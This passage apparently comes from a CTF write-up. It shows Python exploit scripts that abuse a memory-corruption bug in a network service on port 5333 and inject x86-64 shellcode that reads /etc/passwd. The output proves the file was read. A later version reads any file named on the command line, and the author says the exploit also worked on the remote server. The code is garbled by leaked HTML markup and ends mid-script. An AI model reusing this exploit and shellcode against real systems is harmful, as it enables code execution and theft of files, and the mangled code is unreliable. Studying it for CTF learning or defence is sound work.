<span class="n">p_tmp</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">u</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_tmp</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">L</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="n">p_pivot</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>   <span class="c"># receive pesky &amp;lsquo;&gt; &amp;rsquo;</span>
<span class="n">p_vuln</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">vulnerable</span> <span class="n">pointer</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x</span><span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="mi">08</span><span class="n">x</span><span class="p">}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">send</span> <span class="n">read</span> <span class="n">request</span> <span class="n">to</span> <span class="n">crash</span> <span class="n">binary</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">r</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>   <span class="c"># receive pesky &amp;lsquo;&gt; &amp;rsquo;&lt;/p&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">terminate</span> <span class="n">connection</span> <span class="n">cleanly</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">x</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div></p>

<p>In the other terminal, I observed:</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">connect to <span class="o">[</span>127.0.0.1<span class="o">]</span> from localhost <span class="o">[</span>127.0.0.1<span class="o">]</span> 53500
Trace/breakpoint <span class="nb">trap</span> <span class="o">(</span>core dumped<span class="o">)</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">5333</span> <span class="p">&amp;</span>hellip<span class="p">;</span></code></pre></div></p>

<p>BOOM! Code execution on my local machine!</p>

<p>At this point I wasted some time to cook up a small shellcode that would re-use existing code in the binary, to verify that the stack was indeed executable in the remote binary. It was, whoop-dee-doo! Next I searched for a proper shellcode and stumbled upon <a href="!http://shell-storm.org/shellcode/files/shellcode-878.php">this one</a>.</p>

<p>I stuck it in the exploit and lo and behold:</p>

<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">struct</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">getID</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;(\d.*)$&amp;lsquo;, data.strip())</span>
    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">localhost</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="mi">5333</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">banner</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">send</span> <span class="n">first</span> <span class="n">string</span><span class="o">.</span> <span class="n">this</span> <span class="n">will</span> <span class="n">be</span> <span class="n">our</span> <span class="n">shellcode</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">c</span> <span class="mi">0</span> \<span class="n">xeb</span>\<span class="n">x3f</span>\<span class="n">x5f</span>\<span class="n">x80</span>\<span class="n">x77</span>\<span class="n">x0b</span>\<span class="n">x41</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xc0</span>\<span class="n">x04</span>\<span class="n">x02</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xf6</span>\<span class="n">x0f</span>\<span class="n">x05</span>\<span class="n">x66</span>\<span class="n">x81</span>\<span class="n">xec</span>\<span class="n">xff</span>\<span class="n">x0f</span>\<span class="n">x48</span>\<span class="n">x8d</span>\<span class="n">x34</span>\<span class="n">x24</span>\<span class="n">x48</span>\<span class="n">x89</span>\<span class="n">xc7</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xd2</span>\<span class="n">x66</span>\<span class="n">xba</span>\<span class="n">xff</span>\<span class="n">x0f</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xc0</span>\<span class="n">x0f</span>\<span class="n">x05</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xff</span>\<span class="n">x40</span>\<span class="n">x80</span>\<span class="n">xc7</span>\<span class="n">x01</span>\<span class="n">x48</span>\<span class="n">x89</span>\<span class="n">xc2</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xc0</span>\<span class="n">x04</span>\<span class="n">x01</span>\<span class="n">x0f</span>\<span class="n">x05</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xc0</span>\<span class="n">x04</span>\<span class="n">x3c</span>\<span class="n">x0f</span>\<span class="n">x05</span>\<span class="n">xe8</span>\<span class="n">xbc</span>\<span class="n">xff</span>\<span class="n">xff</span>\<span class="n">xff</span>\<span class="n">x2f</span>\<span class="n">x65</span>\<span class="n">x74</span>\<span class="n">x63</span>\<span class="n">x2f</span>\<span class="n">x70</span>\<span class="n">x61</span>\<span class="n">x73</span>\<span class="n">x73</span>\<span class="n">x77</span>\<span class="n">x64</span>\<span class="n">x41</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>   <span class="c"># receive pesky &amp;lsquo;&gt; &amp;rsquo;</span>
<span class="n">p_shellcode</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x</span><span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="mi">08</span><span class="n">x</span><span class="p">}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_shellcode</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">send</span> <span class="n">second</span> <span class="n">string</span><span class="o">.</span> <span class="n">this</span> <span class="n">will</span> <span class="n">be</span> <span class="n">our</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">pivot</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="n">pointer</span><span class="o">.&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">c</span> <span class="mi">0</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">L</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="n">p_shellcode</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>   <span class="c"># receive pesky &amp;lsquo;&gt; &amp;rsquo;</span>
<span class="n">p_pivot</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">pivot</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x</span><span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="mi">08</span><span class="n">x</span><span class="p">}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_pivot</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">let</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">s</span> <span class="n">crash</span> <span class="n">the</span> <span class="n">binary</span> <span class="n">to</span> <span class="n">see</span> <span class="k">if</span> <span class="n">this</span> <span class="n">works</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">c</span> <span class="mi">1</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>   <span class="c"># receive pesky &amp;lsquo;&gt; &amp;rsquo;</span>
<span class="n">p_tmp</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">u</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_tmp</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">L</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="n">p_pivot</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>   <span class="c"># receive pesky &amp;lsquo;&gt; &amp;rsquo;</span>
<span class="n">p_vuln</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">vulnerable</span> <span class="n">pointer</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x</span><span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="mi">08</span><span class="n">x</span><span class="p">}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">send</span> <span class="n">read</span> <span class="n">request</span> <span class="n">to</span> <span class="n">crash</span> <span class="n">binary</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">r</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">terminate</span> <span class="n">connection</span> <span class="n">cleanly</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">x</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div></p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>+<span class="o">]</span> <span class="nv">shellcode</span> <span class="o">=</span> 0x01355030
<span class="o">[</span>+<span class="o">]</span> <span class="nv">pivot</span> <span class="o">=</span> 0x01355030
<span class="o">[</span>+<span class="o">]</span> vulnerable <span class="nv">pointer</span> <span class="o">=</span> 0x013552b0
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
<span class="p">&amp;</span>hellip<span class="p">;</span>snip<span class="p">&amp;</span>hellip<span class="p">;</span></code></pre></div></p>

<p>This also worked against the remote server! It showed me that there was a user called <code>amazon</code> with home directory <code>/home/amazon</code>. I adapted the exploit a bit to make it read arbitrary files. The instruction that needs adjusting is this one:</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="p">;</span> NULL byte fix
xor byte <span class="o">[</span>rdi + 11<span class="o">]</span>, 0x41</code></pre></div></p>

<p>We need to update the value 11, or <code>0x0b</code>. The exploit code was modified once more, spraying <code>time.sleep()</code> calls here and there:</p>

<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">sys</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">getID</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;(\d.*)&amp;lsquo;, data.strip())</span>
    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">localhost</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="mi">5333</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">banner</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
<span class="n">filename</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">send</span> <span class="n">first</span> <span class="n">string</span><span class="o">.</span> <span class="n">this</span> <span class="n">will</span> <span class="n">be</span> <span class="n">our</span> <span class="n">shellcode</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">c</span> <span class="mi">0</span> \<span class="n">xeb</span>\<span class="n">x3f</span>\<span class="n">x5f</span>\<span class="n">x80</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">+</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">b</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="n">length</span><span class="p">)</span><span class="o">+&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">x41</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xc0</span>\<span class="n">x04</span>\<span class="n">x02</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xf6</span>\<span class="n">x0f</span>\<span class="n">x05</span>\<span class="n">x66</span>\<span class="n">x81</span>\<span class="n">xec</span>\<span class="n">xff</span>\<span class="n">x0f</span>\<span class="n">x48</span>\<span class="n">x8d</span>\<span class="n">x34</span>\<span class="n">x24</span>\<span class="n">x48</span>\<span class="n">x89</span>\<span class="n">xc7</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xd2</span>\<span class="n">x66</span>\<span class="n">xba</span>\<span class="n">xff</span>\<span class="n">x0f</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xc0</span>\<span class="n">x0f</span>\<span class="n">x05</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xff</span>\<span class="n">x40</span>\<span class="n">x80</span>\<span class="n">xc7</span>\<span class="n">x01</span>\<span class="n">x48</span>\<span class="n">x89</span>\<span class="n">xc2</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xc0</span>\<span class="n">x04</span>\<span class="n">x01</span>\<span class="n">x0f</span>\<span class="n">x05</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xc0</span>\<span class="n">x04</span>\<span class="n">x3c</span>\<span class="n">x0f</span>\<span class="n">x05</span>\<span class="n">xe8</span>\<span class="n">xbc</span>\<span class="n">xff</span>\<span class="n">xff</span>\<span class="n">xff</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">+</span><span class="n">filename</span><span class="o">+&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">A</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>  <span class="c"># receive pesky &amp;lsquo;&gt; &amp;rsquo;&lt;/h1&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">p_shellcode</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x</span><span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="mi">08</span><span class="n">x</span><span class="p">}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_shellcode</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">send</span> <span class="n">second</span> <span class="n">string</span><span class="o">.</span> <span class="n">this</span> <span class="n">will</span> <span class="n">be</span> <span class="n">our</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">pivot</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="n">pointer</span><span class="o">.&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

